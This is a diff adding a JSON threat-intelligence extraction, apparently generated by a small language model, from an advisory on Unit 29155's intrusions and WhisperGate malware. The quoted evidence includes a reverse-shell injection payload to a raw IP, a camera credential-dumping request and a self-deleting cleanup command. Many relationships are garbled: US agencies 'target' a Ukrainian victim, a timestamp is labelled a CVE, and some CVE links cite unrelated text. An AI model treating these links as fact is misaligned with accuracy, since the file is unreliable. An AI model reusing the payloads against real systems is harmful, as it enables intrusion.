+   "type": "ipv4-addr",
+   "value": "179.43.175[.]108",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.176[.]60",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.187[.]47",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.189[.]218",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "185.245.84[.]227",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "185.245.85[.]251",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "194.26.29[.]84",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "194.26.29[.]95",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "194.26.29[.]98",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "194.26.29[.]251",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "domain-name",
+   "value": "interlinks[.]top",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "domain-name",
+   "value": "3proxy[.]ru",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "domain-name",
+   "value": "ngrok[.]com",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "domain-name",
+   "value": "nssm[.]cc",
+   "indicates": [
+    "Unit 29155"
+   ]
+  }
+ ],
+ "relationships": [
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1595.001",
+   "evidence": "s [T1595.001] used within multiple government and critical infrastructure organizations."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1595.002",
+   "evidence": "Acunetix: Unit 29155 cyber actors leveraged both Acunetix and Nmap to identify open ports, services, and vulnerabilities for networks [T1595.002]."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1590.002",
+   "evidence": "Amass: Unit 29155 cyber actors leveraged both Amass and VirusTotal to obtain subdomains for target websites [T1590.002]."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1046",
+   "evidence": "Nmap: Once Unit 29155 cyber actors gained access to victim internal networks, they further used Nmap (via the Nmap Scripting Engine [NSE]) to write custom scripts for discovering and scanning other machines [T1046]."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1596.005",
+   "evidence": "Shodan: Unit 29155 cyber actors used Shodan to identify hosts with a specific set of vulnerabilities or device types [T1596.005]."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1588.005",
+   "evidence": "Unit 29155 cyber actors have been observed obtaining the respective exploit scripts for, but not exploiting, the following CVEs: ... [T1588.005]."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "targets",
+   "target": "CVE-2020-1472",
+   "evidence": "Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration [T1572] over port 1194, and in some instances, to perform Active Directory (AD) enumeration."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "targets",
+   "target": "CVE-2021-26084",
+   "evidence": "Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration [T1572] over port 1194, and in some instances, to perform Active Directory (AD) enumeration."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "targets",
+   "target": "CVE-2021-3156",
+   "evidence": "Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration [T1572] over port 1194, and in some instances, to perform Active Directory (AD) enumeration."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "targets",
+   "target": "CVE-2021-4034",
+   "evidence": "Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration [T1572] over port 1194, and in some instances, to perform Active Directory (AD) enumeration."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "targets",
+   "target": "CVE-2022-27666",
+   "evidence": "Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration [T1572] over port 1194, and in some instances, to perform Active Directory (AD) enumeration."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "targets",
+   "target": "CVE-2021-33044",
+   "evidence": "Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [T1190], as detailed throughout this advisory: ... [CVE-2021-33044]."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "targets",
+   "target": "CVE-2021-33045",
+   "evidence": "Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [T1190], as detailed throughout this advisory: ... [CVE-2021-33045]."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "targets",
+   "target": "CVE-2022-26134",
+   "evidence": "Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [T1190], as detailed throughout this advisory: ... [CVE-2022-26134]."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "targets",
+   "target": "CVE-2022-26138",
+   "evidence": "Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [T1190], as detailed throughout this advisory: ... [CVE-2022-26138]."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "targets",
+   "target": "CVE-2022-3236",
+   "evidence": "Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [T1190], as detailed throughout this advisory: ... [CVE-2022-3236]."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1190",
+   "evidence": "Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [T1190], as detailed throughout this advisory: ..."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1078.001",
+   "evidence": "Unit 29155 cyber actors have used Shodan to scan for Internet of Things (IoT) devices, using exploitation scripts to authenticate to IP cameras with default usernames and passwords [T1078.001]."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1125",
+   "evidence": "Unit 29155 cyber actors have used Shodan to scan for Internet of Things (IoT) devices, using exploitation scripts to authenticate to IP cameras with default usernames and passwords [T1078.001], and exfiltrating images [T1125]."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1552.001",
+   "evidence": "Unit 29155 cyber actors have used Shodan to scan for Internet of Things (IoT) devices, using exploitation scripts to authenticate to IP cameras with default usernames and passwords [T1078.001], and exfiltrating images [T1125] (JPG files). Attempts are then made to perform remote command execution via web to vulnerable IP cameras; if successful, cyber actors would dump configuration settings and credentials in plaintext (as shown in Table 1 below) [T1552.001]."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1003",
+   "evidence": "Web requests observed from victim infrastructure These requests are likely intended to dump configuration settings and credentials [T1003]: hxxp://<IP>:<port>/PictureCatch.cgi?username=<NAME>&password= %3becho%20%22%3c%21--%23include%20file=%22SYS_CFG%22-- %3e%22%3etmp/Login.htm%3b&data_type=1&attachment=1&channel=1& secret=1&key=PWNED"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1071.001",
+   "evidence": "POST requests sent to victims with payloads [T1071.001] \"txtUser=lol&txtPassword=2&btConnect=Piesl%C4%93gtiesbtConnect=Piesl%C4%93gties&chRemember=on&txtPassword=g00dPa%24%24w0rD&txtUser=$%7b@print(system(%22bash%20i%20%3E%26%20%2Fdev%2Ftcp%2F179.43.175.38%2F6870%200%3E%261%22))%7d\""
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1567.002",
+   "evidence": "In one instance shortly following a deployment of WhisperGate malware, Unit 29155 cyber actors exfiltrated data to mega[.]nz using Rclone [T1567.002]."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1550.002",
+   "evidence": "Unit 29155 cyber actors used a Pass-the-Hash [T1550.002] via ProxyChains."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1560",
+   "evidence": "Unit 29155 cyber actors compressing victim data [T1560] (e.g., the entire filesystem, select file system artifacts or user data, and/or database dumps) to send back to their infrastructure."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1003.001",
+   "evidence": "Unit 29155 cyber actors have exfiltrated LSASS memory dumps to retrieve credentials from victim machines."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1003.002",
+   "evidence": "Unit 29155 cyber actors have exfiltrated usernames and hashed passwords from the SAM."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1654",
+   "evidence": "Unit 29155 cyber actors have enumerated and exfiltrated SECURITY and SYSTEM logs."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1059.001",
+   "evidence": "powershell New-MailboxExportRequest – Mailbox <resource> – FilePath `\\{IP Address}\nsharefolder\file.pst`."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1590.002",
+   "evidence": "Unit 29155 cyber actors have used Amass and VirusTotal to obtain information about victims’ DNS for possible use during targeting, such as subdomains for target websites."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1595",
+   "evidence": "Unit 29155 cyber actors use publicly available tools to gather information for possible use during targeting."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1595.001",
+   "evidence": "Unit 29155 cyber actors use various open source scanning tools to scan for victim IP ranges."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1595.002",
+   "evidence": "Unit 29155 cyber actors use publicly available scanning tools to enable their discovery of IoT devices and exploitable vulnerabilities."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1596.005",
+   "evidence": "Unit 29155 cyber actors use publicly available platforms like Shodan to identify internet connected hosts."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1583.003",
+   "evidence": "Unit 29155 cyber actors have used VPSs to host their operational tools, perform reconnaissance, exploit victim infrastructure, and exfiltrate victim data."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1588.001",
+   "evidence": "Unit 29155 cyber actors obtain publicly available malware and malware loaders to support their operations. For example, analysis suggests Raspberry Robin malware may have been used in the role of an access broker."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1588.005",
+   "evidence": "Unit 29155 cyber actors are known to obtain CVE exploit scripts from GitHub repositories and use them against victim infrastructure."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1078.001",
+   "evidence": "Unit 29155 cyber actors use exploitation scripts to authenticate to IP cameras with default usernames and passwords."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1190",
+   "evidence": "Unit 29155 cyber actors have used a variety of public exploits, including CVE-2021-33044, CVE-2021-33045, CVE-2022-26134, and CVE-2022-26138."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1059.001",
+   "evidence": "Unit 29155 cyber actors have used PowerShell to execute commands and other operational tasks."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1505.003",
+   "evidence": "Unit 29155 cyber actors use web shells to establish persistent access to systems."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1046",
+   "evidence": "Once Unit 29155 cyber actors gained access to victim internal networks, they further used Nmap (via the NSE) to write custom scripts for discovering and scanning other machines."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1550.002",
+   "evidence": "Unit 29155 cyber actors used Pass-the-Hash to authenticate via SMB."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1114",
+   "evidence": "Unit 29155 cyber actors have used their infrastructure to compromise multiple victims’ mail servers and exfiltrate mail artifacts, such as email messages."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1125",
+   "evidence": "Unit 29155 cyber actors have exploited IoT devices, specifically IP cameras with default usernames and passwords, and exfiltrated images."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1213.001",
+   "evidence": "Unit 29155 cyber actors leveraged Through the Wire against the victim’s internet-facing Confluence server."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1560",
+   "evidence": "Unit 29155 cyber actors compress victim data (e.g., the entire filesystem, select file system artifacts or user data, and/or database dumps) to send back to their infrastructure."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1090.003",
+   "evidence": "Unit 29155 cyber actors executed commands via ProxyChains—a tool used to route internal traffic through a series of proxies."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1071.001",
+   "evidence": "Unit 29155 cyber actors use POST requests over HTTP to send payloads to victims."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "attack-pattern",
+   "evidence": "Unit 29155 cyber actors executed commands via ProxyChains—a tool used to route internal traffic through a series of proxies."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "attack-pattern",
+   "evidence": "Application Layer Protocol: Web Protocols T1071.001 Unit 29155 cyber actors use POST requests over HTTP to send payloads to victims."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "attack-pattern",
+   "evidence": "Application Layer Protocol: DNS T1071.004 Unit 29155 cyber actors used DNS tunneling tools, such as dnscat/2 and Iodine, to tunnel IPv4 network traffic."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "attack-pattern",
+   "evidence": "Non-Application Layer Protocol T1095 Unit 29155 cyber actors commonly use a reverse TCP connection to initiate communication with their infrastructure."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "attack-pattern",
+   "evidence": "Ingress Tool Transfer T1105 When an exploit is successfully executed on a victim system, Unit 29155 cyber actors are known to launch the Meterpreter payload to initiate communication with their actor-controlled systems."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "attack-pattern",
+   "evidence": "Protocol Tunneling T1572 Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration to tunnel traffic over a single port (1194), VPNs, and GOST to anonymize their operational activity."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "attack-pattern",
+   "evidence": "Exfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002 Unit 29155 cyber actors exfiltrated data to the cloud storage and file hosting service, MEGA (mega[.]nz), using Rclone."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "attack-pattern",
+   "evidence": "Data Destruction T1485 Unit 29155 cyber actors’ objectives include the destruction of data."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "WhisperGate",
+   "evidence": "The analysis provides insight into Unit 29155 cyber actor infrastructure used for network scanning, password compromising, and data exfiltration against Ukraine, NATO members in Europe and North America, and countries in Latin America and Central Asia."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "targets",
+   "target": "Energy",
+   "evidence": "The analysis provides insight into Unit 29155 cyber actor infrastructure used for network scanning, password compromising, and data exfiltration against Ukraine, NATO members in Europe and North America, and countries in Latin America and Central Asia."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "originates-from",
+   "target": "Russia",
+   "evidence": "Russian National Charged for Conspiring with Russian Military Intelligence to Destroy Ukrainian Government Computer Systems and Data"
+  },
+  {
+   "source": "WhisperGate",
+   "type": "exploits",
+   "target": "CVE-2022-26134",
+   "evidence": "Confluence Server and Data Center - CVE-2022-26134"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "targets",
+   "target": "CERT-UA",
+   "evidence": "SaintBot, as detailed by CERT-UA"
+  },
+  {
+   "source": "stage2.exe",
+   "type": "uses",
+   "target": "T1059.001",
+   "evidence": "HTTP GET request sent to Discord URL to download Tbopbh.jpg."
+  },
+  {
+   "source": "stage2.exe",
+   "type": "targets",
+   "target": "Energy",
+   "evidence": "Russian Military Cyber Actors Target US and Global Critical Infrastructure."
+  },
+  {
+   "source": "stage2.exe",
+   "type": "targets",
+   "target": "Russia",
+   "evidence": "Russian Military Cyber Actors Target US and Global Critical Infrastructure."
+  },
+  {
+   "source": "stage2.exe",
+   "type": "targets",
+   "target": "Ukrainian victim",
+   "evidence": "stage2.exe was obtained from the C:\\ path of the Ukrainian victim’s Windows machine."
+  },
+  {
+   "source": "stage2.exe",
+   "type": "targets",
+   "target": "CVE-2022-01-10",
+   "evidence": "TimeDateStamp 2022-01-10 05:37:18."
+  },
+  {
+   "source": "stage2.exe",
+   "type": "uses",
+   "target": "AdvancedRun.exe",
+   "evidence": "AdvancedRun.exe created and executed twice."
+  },
+  {
+   "source": "stage2.exe",
+   "type": "uses",
+   "target": "InstallUtil.exe",
+   "evidence": "InstallUtil.exe created and executed; files corrupted following execution."
+  },
+  {
+   "source": "Tbopbh.jpg",
+   "type": "targets",
+   "target": "Energy",
+   "evidence": "Russian Military Cyber Actors Target US and Global Critical Infrastructure."
+  },
+  {
+   "source": "Tbopbh.jpg",
+   "type": "targets",
+   "target": "Russia",
+   "evidence": "Russian Military Cyber Actors Target US and Global Critical Infrastructure."
+  },
+  {
+   "source": "Tbopbh.jpg",
+   "type": "targets",
+   "target": "Ukrainian victim",
+   "evidence": "stage2.exe was obtained from the C:\\ path of the Ukrainian victim’s Windows machine."
+  },
+  {
+   "source": "Tbopbh.jpg",
+   "type": "targets",
+   "target": "CVE-2022-01-10",
+   "evidence": "TimeDateStamp 2022-01-10 05:37:18."
+  },
+  {
+   "source": "FBI",
+   "type": "targets",
+   "target": "Ukrainian victim",
+   "evidence": "FBI | CISA | NSA | et. al."
+  },
+  {
+   "source": "CISA",
+   "type": "targets",
+   "target": "Ukrainian victim",
+   "evidence": "FBI | CISA | NSA | et. al."
+  },
+  {
+   "source": "NSA",
+   "type": "targets",
+   "target": "Ukrainian victim",
+   "evidence": "FBI | CISA | NSA | et. al."
+  },
+  {
+   "source": "WhisperKill",
+   "type": "targets",
+   "target": "sector",
+   "evidence": "The reversed and decompressed Waqybg files contained file corruption logic along with a final command to ping arbitrarily and delete itself: cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 > Nul & Del /f /q \"%s\"."
+  },
+  {
+   "source": "WhisperGate",
+   "type": "uses",
+   "target": "WhisperKill",
+   "evidence": "Waqybg is known as WhisperKill—a malware downloaded by WhisperGate that destroys files with specific extensions."
+  },
+  {
+   "source": "stage2.exe",
+   "type": "uses",
+   "target": "WhisperKill",
+   "evidence": "stage2.exe and its respective payload, Tbopbh.jpg, served as a template for other malware within Discord Cluster 1."
+  },
+  {
+   "source": "Frkmlkdkdubkznbkmcf.dll",
+   "type": "uses",
+   "target": "WhisperKill",
+   "evidence": "Malware analysts decoded and decrypted one of the resources from Frkmlkdkdubkznbkmcf.dll (78c855a088924e92a7f60d661c3d1845)."
+  },
+  {
+   "source": "Tbopbh.jpg",
+   "type": "uses",
+   "target": "WhisperGate",
+   "evidence": "stage2.exe and its respective payload, Tbopbh.jpg, served as a template for other malware within Discord Cluster 1."
+  },
+  {
+   "source": "EazFuscator",
+   "type": "uses",
+   "target": "attack-pattern",
+   "evidence": "Note: This format annotates action taken by EazFuscator to obfuscate items, making it difficult for malware analysts to review."
+  },
+  {
+   "source": "WScript.Shell",
+   "type": "uses",
+   "target": "attack-pattern",
+   "evidence": "The VBS code listed in Table 22 used a WScript shell that executed as a Windows application, which ran a PowerShell command to exclude the C:\\ drive from Windows Defender's security checks."
+  },
+  {
+   "source": "PowerShell",
+   "type": "uses",
+   "target": "attack-pattern",
+   "evidence": "The VBS code listed in Table 22 used a WScript shell that executed as a Windows application, which ran a PowerShell command to exclude the C:\\ drive from Windows Defender's security checks."
+  },
+  {
+   "source": "MinGW(GCC: (GNU) 6.3.0)",
+   "type": "uses",
+   "target": "attack-pattern",
+   "evidence": "The reversed and decompressed Waqybg files contained file corruption logic along with a final command to ping arbitrarily and delete itself: cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 > Nul & Del /f /q \"%s\"."
+  },
+  {
+   "source": "GNU linker Id (GNU Binutils)(2.28)",
+   "type": "uses",
+   "target": "attack-pattern",
+   "evidence": "The reversed and decompressed Waqybg files contained file corruption logic along with a final command to ping arbitrarily and delete itself: cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 > Nul & Del /f /q \"%s\"."
+  },
+  {
+   "source": "Russia",
+   "type": "originates-from",
+   "target": "country",
+   "evidence": "Russian Military Cyber Actors Target US and Global Critical Infrastructure"
+  },
+  {
+   "source": "Russia",
+   "type": "targets",
+   "target": "sector",
+   "evidence": "Russian Military Cyber Actors Target US and Global Critical Infrastructure"
+  },
+  {
+   "source": "Russia",
+   "type": "targets",
+   "target": "country",
+   "evidence": "Russian Military Cyber Actors Target US and Global Critical Infrastructure"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "ngrok",
+   "evidence": "https://ngrok[.]com (Note: This domain is a legitimate service leveraged for malicious purposes by Unit 29155 cyber actors and should be investigated prior to blocking.)"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "interlinks[.]top",
+   "evidence": "Table 28: Domains Hosting Jump Host Tooling"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "3proxy[.]ru",
+   "evidence": "Table 28: Domains Hosting Jump Host Tooling"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "nssm[.]cc",
+   "evidence": "Table 28: Domains Hosting Jump Host Tooling"
+  }
+ ],
+ "_meta": {
+  "engine": "0.1",
+  "model": "qwen3:8b",
+  "seconds": 2193.2,
+  "errors": "3 unparsable chunk(s)"
+ }
+}
